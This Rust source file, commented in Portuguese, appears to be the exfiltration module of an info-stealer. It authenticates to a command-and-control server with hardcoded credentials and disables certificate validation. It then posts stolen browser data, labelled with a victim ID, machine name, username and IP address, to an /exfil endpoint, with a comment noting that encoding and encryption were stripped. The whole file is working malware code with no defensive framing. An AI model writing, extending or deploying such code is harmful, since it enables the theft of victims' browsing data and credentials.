use reqwest::blocking::Client;
use serde_json::json;
use std::net::UdpSocket;

// Configurações do C2
const C2_HOST: &str = "127.0.0.1";
const C2_PORT: u16 = 8443;
const USERNAME: &str = "admin";
const PASSWORD: &str = "bfacbadf1213467d95d777b33bd10a29";

/// Envia os dados coletados (DADOS BRUTOS) para o C2
pub fn send_to_c2(data: &str, machine_name: &str, username: &str, ip_address: &str) -> Result<(), String> {
    if data.is_empty() {
        println!("[EXFIL] Nenhum dado para enviar.");
        return Ok(());
    }

    println!("[EXFIL] Preparando envio de {} bytes de dados brutos...", data.len());
    
    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| format!("Falha ao criar cliente: {}", e))?;
    
    // 1. AUTENTICAÇÃO (Obter o Token Bearer)
    println!("[EXFIL] Autenticando no C2...");
    let login_url = format!("http://{}:{}/login", C2_HOST, C2_PORT);
    let login_payload = json!({
        "username": USERNAME,
        "password": PASSWORD
    });
    
    let login_response = client
        .post(&login_url)
        .json(&login_payload)
        .send()
        .map_err(|e| format!("Erro na conexão de login: {}", e))?;
    
    if !login_response.status().is_success() {
        return Err(format!("Login falhou: {}", login_response.status()));
    }
    
    let auth_data: serde_json::Value = login_response
        .json()
        .map_err(|e| format!("Erro ao processar JSON de login: {}", e))?;

    let token = auth_data["token"]
        .as_str()
        .ok_or("Token não encontrado na resposta do C2")?
        .to_string();
    
    println!("[EXFIL] Token obtido com sucesso.");

    // 2. ENVIO DO PAYLOAD (DADO BRUTO)
    // Removido o Base64 para o dado chegar puro no servidor
    let url = format!("http://{}:{}/exfil", C2_HOST, C2_PORT);
    
    let payload = json!({
        "victim_id": format!("{}-{}", machine_name, username),
        "machine_name": machine_name,
        "username": username,
        "ip_address": ip_address,
        "data_type": "browser_data",
        "data": data, // <--- AQUI VAI O TEXTO PURO (SEM BASE64, SEM AES)
        "timestamp": chrono::Utc::now().to_rfc3339()
    });
    
    println!("[EXFIL] Enviando dados brutos para o servidor...");
    let response = client
        .post(&url)
        .bearer_auth(token)
        .json(&payload)
        .send()
        .map_err(|e| format!("Erro no envio do payload: {}", e))?;
    
    if response.status().is_success() {
        println!("[EXFIL] Sucesso Total! Dados entregues ao C2.");
        Ok(())
    } else {
        let status = response.status();
        let error_msg = response.text().unwrap_or_default();
        Err(format!("Erro no servidor ({}): {}", status, error_msg))
    }
}

/// Obtém o IP local da máquina
pub fn get_local_ip() -> Option<String> {
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:80").ok()?;
    socket.local_addr().ok().map(|addr| addr.ip().to_string())
}